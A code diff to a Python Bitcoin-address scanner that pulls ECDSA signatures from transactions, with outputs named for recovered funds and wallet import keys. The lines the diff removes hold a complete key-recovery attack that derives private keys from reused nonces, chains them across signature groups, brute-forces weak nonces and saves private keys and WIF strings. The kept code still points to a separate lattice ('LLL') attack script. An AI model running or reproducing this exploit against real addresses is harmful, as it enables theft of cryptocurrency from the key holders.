@@ -58,8 +58,6 @@ MAX_DISPLAYED_ADDRESSES = 10
 # Recovery Config
 BRUTE_FORCE_LIMIT = 5000000  # Checks small 'k' values up to 5,000,000
 OUTPUT_DIR = "reports"
-OUTPUT_R_NONCE = os.path.join(OUTPUT_DIR, "rnonce.txt")
-OUTPUT_R_NON = os.path.join(OUTPUT_DIR, "rnon.txt")
 OUTPUT_LLL_CANDIDATES = os.path.join(OUTPUT_DIR, "LLL_CANDIDATES.txt")
 OUTPUT_CSV = "RECOVERED_FUNDS_FINAL.csv"
 OUTPUT_WIF = "wallet_import_keys_final.txt"
@@ -74,8 +72,6 @@ CURRENT_ADDRESS = ""
 EXIT_FLAG = False
 REPORTS: List[Dict[str, Any]] = []
 MAX_TRANSACTIONS = 0
-GLOBAL_R_MAP: Dict[int, List[Dict[str, Any]]] = defaultdict(list)
-SAVED_R_GROUPS: Dict[str, List[str]] = defaultdict(list)
 
 SESSION = requests.Session()
 SESSION.headers.update({"User-Agent": "SafeBTCScanner-Mempool/4.0-fixed"})
@@ -498,31 +494,6 @@ def extract_signatures(transactions: List[dict]) -> List[Dict[str, Any]]:
                 sigs.append({"txid": txid, "vin": vin_idx, "r": r, "s": s, "pubkey": pubkey, "z": z})
     return sigs
 
-def check_reused_nonce(address: str, signatures: List[Dict[str, Any]]):
-    for s in signatures:
-        GLOBAL_R_MAP[s["r"]].append(s)
-
-def save_rnonce():
-    os.makedirs(OUTPUT_DIR, exist_ok=True)
-    with open(OUTPUT_R_NON, "w", encoding="utf-8") as f:
-        for r_val, items in GLOBAL_R_MAP.items():
-            if len(items) < 2: continue
-
-            # Group by distinct (txid, pubkey) to avoid counting same input twice
-            unique_sigs = {}
-            for i in items:
-                k = (i['txid'], i['pubkey'])
-                if k not in unique_sigs: unique_sigs[k] = i
-
-            if len(unique_sigs) < 2: continue
-
-            f.write("="*80 + "\nReused Nonce Group\n" + "="*80 + "\n")
-            f.write(f"r: {hex(r_val)[2:]}\nOccurrences:\n")
-            for _, i in unique_sigs.items():
-                z_str = hex(i['z'])[2:] if i['z'] else "N/A"
-                f.write(f" - txid={i['txid']} s={hex(i['s'])[2:]} z={z_str} pubkey={i['pubkey']}\n")
-            f.write("\n")
-
 # --- LLL Integration ---
 
 def analyze_for_lll(address: str, signatures: List[Dict[str, Any]]):
@@ -601,194 +572,7 @@ def analyze_address(address: str):
     sigs = extract_signatures(txs)
     print(f"Extracted {len(sigs)} signatures")
 
-    check_reused_nonce(address, sigs)
     analyze_for_lll(address, sigs)
-
-# ==============================================================================
-# RECOVERY LOGIC (Phase 1: Chain + Brute Force)
-# ==============================================================================
-
-def attempt_bootstrap(r, s1, z1, s2, z2):
-    candidates = []
-    s1_opts, s2_opts = [s1, N - s1], [s2, N - s2]
-    for _s1 in s1_opts:
-        for _s2 in s2_opts:
-            if _s1 == _s2: continue
-            try:
-                k = ((z1 - z2) * modinv(_s1 - _s2, N)) % N
-                d = ((_s1 * k - z1) * modinv(r, N)) % N
-                candidates.append(d)
-            except: pass
-    return candidates
-
-def attempt_chain(r, s_known, z_known, d_known, s_target, z_target):
-    candidates = []
-    s_known_opts, s_target_opts = [s_known, N - s_known], [s_target, N - s_target]
-    for _sk in s_known_opts:
-        try:
-            k = ((z_known + r * d_known) * modinv(_sk, N)) % N
-            for _st in s_target_opts:
-                d2 = ((_st * k - z_target) * modinv(r, N)) % N
-                candidates.append(d2)
-        except: pass
-    return candidates
-
-def start_recovery_phase1():
-    print("\n[-] Parsing collected data for Phase 1 Recovery...")
-    save_rnonce() # Ensure file is up to date
-
-    try:
-        with open(OUTPUT_R_NON, "r", encoding="utf-8", errors="ignore") as f:
-            raw_data = f.read()
-    except FileNotFoundError:
-        print("[!] No data to recover.")
-        return
-
-    # Parse
-    groups = []
-    current_group = None
-    r_pattern = re.compile(r"r:\s*([0-9a-fA-F]+)")
-    tx_pattern = re.compile(r"s=([0-9a-fA-F]+).*?z=([0-9a-fA-F]+|N/A).*?pubkey=([0-9a-fA-F]+)")
-
-    for line in raw_data.splitlines():
-        line = line.strip()
-        r_match = r_pattern.search(line)
-        if r_match:
-            if current_group and len(current_group['occurrences']) > 0: groups.append(current_group)
-            current_group = {'r_int': int(r_match.group(1), 16), 'occurrences': []}
-            continue
-
-        tx_match = tx_pattern.search(line)
-        if tx_match and current_group:
-            z_str = tx_match.group(2)
-            if z_str != "N/A":
-                current_group['occurrences'].append({
-                    's': int(tx_match.group(1), 16),
-                    'z': int(z_str, 16),
-                    'pub': tx_match.group(3)
-                })
-
-    if current_group and len(current_group['occurrences']) > 0: groups.append(current_group)
-    print(f"[-] Loaded {len(groups)} actionable groups.")
-
-    recovered_db = {}
-
-    # ----------------------------------------------------
-    # PHASE 1.1: Chain Reaction
-    # ----------------------------------------------------
-    print("\n[+] Phase 1.1: Chain Reaction...")
-    attack_active = True
-
-    while attack_active:
-        iteration = 0
-        while True:
-            iteration += 1
-            iter_found = 0
-            for group in groups:
-                r = group['r_int']
-                entries = group['occurrences']
-                k_implied = None
-
-                # Method A: Self-Reuse
-                if k_implied is None:
-                    by_pub = defaultdict(list)
-                    for e in entries: by_pub[e['pub']].append(e)
-                    for pub, subs in by_pub.items():
-                        if len(subs) > 1 and pub not in recovered_db:
-                            e1, e2 = subs[0], subs[1]
-                            den = (e1['s'] - e2['s']) % N
-                            if den != 0:
-                                k_implied = ((e1['z'] - e2['z']) * modinv(den, N)) % N
-                                break
-
-                # Method B: Known Key
-                if k_implied is None:
-                    for e in entries:
-                        if e['pub'] in recovered_db:
-                            x = recovered_db[e['pub']]
-                            k_implied = (modinv(e['s'], N) * (e['z'] + r * x)) % N
-                            break
-
-                if k_implied is not None:
-                    for e in entries:
-                        if e['pub'] not in recovered_db:
-                            priv = ((e['s'] * k_implied - e['z']) * modinv(r, N)) % N
-                            if verify_key(e['pub'], priv):
-                                recovered_db[e['pub']] = priv
-                                print(f"   [UNLOCK] {e['pub'][:16]}...")
-                                iter_found += 1
-            if iter_found == 0: break
-
-        # ----------------------------------------------------
-        # PHASE 1.2: Brute Force Islands
-        # ----------------------------------------------------
-        unsolved = []
-        for i, group in enumerate(groups):
-            if not any(e['pub'] in recovered_db for e in group['occurrences']):
-                unsolved.append(i)
-
-        if not unsolved:
-            print("[+] All groups solved.")
-            break
-
-        print(f"\n[?] {len(unsolved)} groups remain. Running Brute Force (Limit: {BRUTE_FORCE_LIMIT})...")
-        r_map = {groups[i]['r_int']: i for i in unsolved}
-        pt = curve.generator
-        found_ks = {}
-
-        start = time.time()
-        # Fast scan simulation (pure python is slow, but we do what we can)
-        # Note: In a real "optimized" tool this would be C++ or precomputed
-        for k in range(1, BRUTE_FORCE_LIMIT + 1):
-            if k % 500000 == 0:
-                sys.stdout.write(f"\r    Scanning k={k}...")
-                sys.stdout.flush()
-            rx = pt.x()
-            if rx in r_map:
-                g_idx = r_map[rx]
-                print(f"\n    [CRACKED] Weak nonce k={k} for Group {g_idx}")
-                found_ks[g_idx] = k
-                del r_map[rx]
-                if not r_map: break
-            pt = pt + curve.generator
-
-        sys.stdout.write("\n")
-
-        if found_ks:
-            print(f"[+] Found {len(found_ks)} new nonces! Restarting Chain Reaction...")
-            for g_idx, k_val in found_ks.items():
-                group = groups[g_idx]
-                r = group['r_int']
-                for e in group['occurrences']:
-                    if e['pub'] not in recovered_db:
-                        priv = ((e['s'] * k_val - e['z']) * modinv(r, N)) % N
-                        recovered_db[e['pub']] = priv
-                        print(f"   [INJECT] {e['pub'][:16]}...")
-        else:
-            print("[-] No weak nonces found.")
-            attack_active = False
-
-    # Save Phase 1 Results
-    if recovered_db:
-        print(f"\n[+] PHASE 1 SUCCESS: {len(recovered_db)} Keys Found.")
-        with open(OUTPUT_CSV, "a", newline="") as f:
-            w = csv.writer(f)
-            # Only write header if file empty (simple check: if not exists or size 0, assumed handled by scanner open mode)
-            # But here we append.
-            # w.writerow(["Public Key", "Private Key Hex", "WIF", "Type", "P2PKH", "P2WPKH", "P2SH"])
-            wif_list = []
-            for pub, priv_int in recovered_db.items():
-                priv_hex = hex(priv_int)[2:].zfill(64)
-                compressed = not (pub.startswith('04') and len(pub) == 130)
-                wif = priv_to_wif(priv_hex, compressed)
-                a1, a2, a3 = pub_to_addresses(pub)
-                w.writerow([pub, priv_hex, wif, "Compressed" if compressed else "Uncompressed", a1, a2, a3])
-                wif_list.append(wif)
-        with open(OUTPUT_WIF, "a") as f: f.write("\n".join(wif_list) + "\n")
-        print(f"Saved to {OUTPUT_CSV} and {OUTPUT_WIF}")
-    else:
-        print("No keys recovered in Phase 1.")
-
 # ==============================================================================
 # MAIN
 # ==============================================================================
@@ -832,21 +616,13 @@ def main():
             analyze_address(addr)
 
         print("\n" + "="*80)
-        print("SCAN COMPLETE. STARTING PHASE 1 RECOVERY...")
-        print("="*80)
-
-        # 1. Standard Recovery
-        start_recovery_phase1()
-
-        print("\n" + "="*80)
-        print("NOTE: To run Phase 2 (LLL Attack), execute:")
+        print("SCAN COMPLETE.")
+        print("NOTE: To run LLL Attack, execute:")
         print("      python3 lll_manager.py")
         print("="*80)
 
     except KeyboardInterrupt:
-        print("\n\n[!] Interrupted! Starting Phase 1 recovery on collected data...")
-        start_recovery_phase1()
-        print("\n[!] Run 'python3 lll_manager.py' for LLL attacks.")
+        print("\n\n[!] Interrupted! Run 'python3 lll_manager.py' for LLL attacks.")
 
 if __name__ == "__main__":
     main()
